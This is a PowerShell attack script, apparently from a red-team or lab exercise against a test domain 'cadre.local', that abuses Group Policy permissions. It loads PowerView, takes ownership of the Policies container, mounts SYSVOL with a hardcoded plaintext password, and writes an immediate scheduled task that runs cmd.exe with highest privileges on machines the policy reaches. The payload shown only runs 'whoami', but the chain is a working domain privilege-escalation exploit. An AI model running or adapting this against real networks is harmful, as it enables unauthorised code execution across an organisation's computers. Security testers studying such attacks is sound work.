# T023 - GPO Abuse as analyst_cloud (cadre.local) - ws01 native
# In-script explicit credentials via PowerView -Credential (no Start-Process / schtask)
# ACE#1 grants analyst_cloud WriteDacl/WriteOwner on Vulnerable-GPO
# Chain: take ownership -> grant self GenericAll -> write Scheduled Task preference to SYSVOL
$ErrorActionPreference = 'Continue'
$outDir = 'C:\Tools\cadre-attack'

Write-Output '=== T023: GPO Abuse as analyst_cloud ==='

$secpass = ConvertTo-SecureString 'Cl0ud_An@lyst!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('cadre.local\analyst_cloud', $secpass)
. "$outDir\PowerView.ps1"

$GPO_GUID = '{885EE71C-79CD-4006-B7CF-616B449F745B}'   # Vulnerable-GPO
$sysvol = "\\cadre.local\SysVol\cadre.local\Policies\$GPO_GUID"

# 1) Confirm ACL
Write-Output '--- Vulnerable-GPO ACL (analyst_cloud) ---'
Get-DomainObjectAcl -Credential $cred -SearchBase "CN=Policies,CN=System,DC=cadre,DC=local" -ResolveGUIDs -Domain cadre.local -DomainController dc01.cadre.local |
  Where-Object { $_.ObjectDN -match $GPO_GUID } |
  Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType, SecurityIdentifier |
  Format-Table -AutoSize | Out-String | ForEach-Object { Write-Output $_ }

# 2) Take ownership + grant self FullControl on the GPO container (WriteDacl/WriteOwner primed)
$gp = Get-DomainGPO -Credential $cred -Domain cadre.local -DomainController dc01.cadre.local | Where-Object { $_.gpcfilesyspath -match $GPO_GUID }
if (-not $gp) { Write-Output 'GPO_NOT_FOUND'; exit 1 }
Write-Output "GPO_TARGET|$($gp.displayName)|$($gp.gpcFileSysPath)"

# TakeOwnerShip + AddACE via PowerView
try {
  $sid = (Get-DomainUser analyst_cloud -Credential $cred -Domain cadre.local).objectsid
  Set-DomainObjectOwner -Credential $cred -Identity "CN=Policies,CN=System,DC=cadre,DC=local" -BlobOwner $sid -Domain cadre.local -DomainController dc01.cadre.local 2>&1 | ForEach-Object { Write-Output "OWNER|$_" }
  Write-Output 'OWNERSHIP_DONE'
} catch { Write-Output "OWNERSHIP_FAIL|$($_.Exception.Message)" }

# 3) Mount SYSVOL GPO share as analyst_cloud and write ScheduledTasks.xml preference
$stPath = "$sysvol\Machine\Preferences\ScheduledTasks"
Write-Output "SYSVOL_TARGET|$stPath"
try {
  # Authenticate the SMB session as analyst_cloud (in-script, explicit creds)
  $netUse = (cmd /c "net use \\cadre.local\SysVol\cadre.local\Policies /user:cadre\analyst_cloud Cl0ud_An@lyst! 2>&1")
  $netUse | ForEach-Object { Write-Output "NETUSE|$_" }

  if (-not (Test-Path $stPath)) { New-Item -ItemType Directory -Path $stPath -Force | Out-Null }
  $xml = @'
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B4FE-AF49DA24B14C}">
  <ImmediateTaskV2 name="CADRE-T023" status="enabled" changed="2026-07-31 10:00:00" image="1" uid="{9DF9E3F8-6D9A-4D7C-9B0B-3B2A1F2C3D4E}">
    <Properties actionType="E" name="CADRE-T023" runAs="cadre\analyst_cloud">
      <Task version="1.2">
        <RegistrationInfo><Author>CADRE</Author></RegistrationInfo>
        <Triggers/>
        <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
        <Settings><Hidden>false</Hidden></Settings>
        <Actions Context="Author"><Exec><Command>cmd.exe</Command><Arguments>/c whoami &gt; C:\Windows\Temp\cadre-t023.txt</Arguments></Exec></Actions>
      </Task>
    </Properties>
  </ImmediateTaskV2>
</ScheduledTasks>
'@
  [System.IO.File]::WriteAllText("$stPath\ScheduledTasks.xml", $xml, (New-Object System.Text.UTF8Encoding($false)))
  Write-Output 'SCHEDTASK_WRITTEN'
  Get-ChildItem "$stPath" | Select-Object Name, Length | Format-Table -AutoSize | Out-String | ForEach-Object { Write-Output "FILES|$_" }
} catch { Write-Output "WRITE_FAIL|$($_.Exception.Message)" }
Write-Output 'T023_DONE'
